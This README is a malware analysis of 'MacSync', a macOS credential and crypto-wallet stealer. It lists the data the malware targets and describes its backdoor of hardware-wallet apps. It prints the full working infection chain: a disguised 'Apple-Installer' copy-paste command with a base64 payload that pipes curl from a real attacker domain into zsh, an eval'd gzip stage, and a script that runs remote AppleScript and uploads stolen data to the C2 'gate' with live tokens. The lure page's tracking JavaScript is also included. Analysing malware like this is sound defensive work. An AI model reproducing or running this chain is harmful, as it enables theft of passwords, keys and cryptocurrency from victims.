# MacSync Malware

**Educational Purposes Only** - This is a breakdown for learning purposes. I take no responsibility for any misuse of this code. This is a direct archive of malware found in the wild and a breakdown on the client-side functionality, the server side code will not be released.

MacSync is a common social-engineering based Mac malware found in the wild. It relies on users running malicious OsaScript-derivative scripts (in this case, AppleScript) to steal things like crypto, browser passwords, and more.

This malware grabs:

- User Login Password
- Chrome Master Password
- Cookies, Saved Credentials & Login Data, Autofill, and Indexed Databases of Google Chrome, Firefox, Safari, Chrome Beta / Dev / Canary, Chromium, Brave, Edge, Opera, Opera GX, Vivaldi, Yandex, Arc, CocCoc
- Grabs Local Extension Settings and Indexed DB for dozens of known extensions including: MetaMask, Phantom, Coinbase Wallet, Trust Wallet, Binance Wallet, OKX, Keplr, Ronin, Exodus, Ledger Live extension, Trezor extension, and many others
- Telegram Desktop (entire directory ~/Library/Application Support/Telegram Desktop/tdata/)
- Mac Keychain (all of ~/Library/Keychains/*.keychain-db)
- Desktop Crypto Wallets (Exodus, Electrum (+ Electrum-LTC), Atomic Wallet, Guarda, Coinomi, Sparrow, Wasabi, Bitcoin Core, Litecoin Core, Dash Core, Dogecoin Core, Monero, Electron Cash, BlueWallet, Trust Wallet, Ledger Live, Ledger Wallet, Trezor Suite, Zengo, Binance, TON Keeper)
- Specific files from Desktop, Documents, Downloads (pdf, doc, docx, txt, rtf, wallet, key, keys, db, kdbx, seed, pem, ovpn & only up to 10mb)
- Apple Notes
- Dev history and keys (~/.zshrc, ~/.zsh_history, ~/.bash_history, ~/.gitconfig, ~/.ssh, ~/.aws, ~/.kube)
- System Info (Username, os version, hardware info, display info)

Upon location of either Ledger Live or Trezor Suite, MacSync will:
- For Ledger Live: replace app.asar + Info.plist
- For Trezor Suite: replace app bundle
Both of these create a backdoor, fully compromising the apps.

Inside site/index.html, you can see the simple site that is used to trap users. It features a copy command button. There is no such thing as `Apple-Installer` in the terminal, and you can see "hidden" among other things were carelessly misspelled in the url. This is designed to build trust with the user and mask the hidden Base64 payload:

**Stage0.sh**
```echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && echo 'ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL2JhcmJlcm1vby5mdW4vY3VybC9lZmQwZDdiZmExMjhlMTc5YzMyYjQ4ZGU4NjY2M2E0OGIwNmVlNjg3OGFhZDdmZjA5MjNlM2FiMWY1OWJiOGM4fHpzaA=='|base64 -D|zsh```

When this Base64 payload is decoded, we can see:

**Stage1.sh**
```#!/bin/zsh
d10670=$(base64 -D <<'PAYLOAD_m1661415490226' | gunzip
H4sIAHwMS2kAA+VUXW/TMBR976+4eNXUSSSx4+ajHWWbkGBoTEPaEJMAVU5y3Vp17ChxoRvw3wnt
1GWlTzwh4Sfr3OPre8+59sGzIFMmuG/mvUJgac1ULk3ulDWDI/jeg3bhCnN4ERT4NTBLrR+xl3uw
cAfUNhcaClsKZSYkE3WGdWmt395COgRnF9jGURa0SDIpWJgiS0Y5D7NhWmAaxzEXwzSjMWKcJqkQ
RSIlHYUcuciYjEZZluZpN6Wo1HSBdxMSsRFFyRLOWcoFLfKYyywOOY8SGcVFvDmkJHyC/gF4MwcU
vhyDm6NZR36vfFlr8BbgNeB5pVh5TpUInIJ3DuRDg7V3NkPjxnBp75XWIoh8CoNLkSvjbDM/hrfG
oYYWgKtruAVGpyyaJkdwVlUaP2J2oVwQ8cTnMQwuzm8u3z0HrRYIbzBf2CN4Na9ticGI+dQfDpPQ
Z2wI10KKWj0cI+tS2qa9tukx9B/aJ0DmzlXjIOhvTAiKOyNKlZ+4VTHpr3U/rL61W0bgB9hGNHmt
KrdxVDf4f0jwZ+9SdcbiBDyDe8YCV8oB6/K3Kt3C+6vrG/i85f5LOu1UtUeyHUaux0Cfot0ZoE8i
r4FIpXFyGriyClpZtZ3NlJn596oiu8xsqXTRNaIT3/VtJhySv7KlLsGTsKee3s9em2vn6wPSPyVw
+Jh0nZD2tu/h4YI2+S9rosloQAUAAA==
PAYLOAD_m1661415490226
)
eval "$d10670"
```

This is an embedded gzip & b64 payload. It's executed with eval and it decodes into a simple shell script, making:

**Stage2.sh**
```
#!/bin/zsh
daemon_function() {
    exec </dev/null
    exec >/dev/null
    exec 2>/dev/null
    local domain="barbermoo.fun"
    local token="efd0d7bfa128e179c32b48de86663a48b06ee6878aad7ff0923e3ab1f59bb8c8"
    local api_key="5190ef1733183a0dc63fb623357f56d6"
    if [ $# -gt 0 ]; then
        curl -k -s --max-time 30 \
          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
          -H "api-key: $api_key" \
          "http://$domain/dynamic?txd=$token&pwd=$1" | osascript
    else
        curl -k -s --max-time 30 \
          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
          -H "api-key: $api_key" \
          "http://$domain/dynamic?txd=$token" | osascript
    fi
    if [ $? -ne 0 ]; then
        exit 1
    fi
    curl -k -X POST \
         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
         -H "api-key: $api_key" \
         -H "cl: 0" \
         --max-time 300 \
         -F "file=@/tmp/osalogging.zip" \
         -F "buildtxd=$token" \
         "http://$domain/gate"
    if [ $? -ne 0 ]; then
        exit 1
    fi
    rm -f /tmp/osalogging.zip
}
if daemon_function "$@" & then
    exit 0
else
    exit 1
fi
```

This fetches a malicious and dynamic payload (AppleScript) then immediately pipes it to OsaScript. It uses a daemon to do so. The script running then creates a zipped bundle of all your extracted data in `/tmp/osalogging.zip`, which is immediately uploaded to the malicious MacSync gate & causing a total compromise.

The malware appears to run in a distribution model, where the specific covered mutation is "barbermoo.fun". The site could well be hosted on a static host by bad actors, however it appears to be running on a DigitalOcean Apache installation. This is likely because of the click notification in index.html that uses serverside functionality to send a Telegram notification:

[index.html (lines 66–116)](site/index.html#L66-L116)
```
document.addEventListener("DOMContentLoaded", () => {

    function sendStatistics(domain, action) {
        fetch("stats.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ domain, action })
        })
        .then(res => res.json())
        .then(data => console.log("Telegram уведомление отправлено:", data))
        .catch(err => console.error("Ошибка отправки статистики:", err));
    }

    // Домен и путь страницы
    const domain = window.location.hostname + window.location.pathname;

    const commandInput = document.getElementById("installCommand");
    const copyBtn = document.getElementById("duplicateCmd");

    // Функция копирования
    async function copyCommand() {
        const commandText = commandInput.value;

        try {
            await navigator.clipboard.writeText(commandText);

            const originalText = copyBtn.textContent;
            copyBtn.textContent = "✓ Copied!";
            setTimeout(() => copyBtn.textContent = originalText, 2000);

            sendStatistics(domain, "Copy Command clicked");

        } catch (error) {
            console.error("Ошибка копирования:", error);
        }
    }

    // Копирование при клике на кнопку
    if (copyBtn) {
        copyBtn.addEventListener("click", copyCommand);
    }

    // Статистика для ссылок скачивания
    const downloadBtns = document.querySelectorAll("a[download]");
    downloadBtns.forEach((btn, index) => {
        btn.addEventListener("click", () => {
            sendStatistics(domain, `download-${index + 1}`);
        });
    });

});
```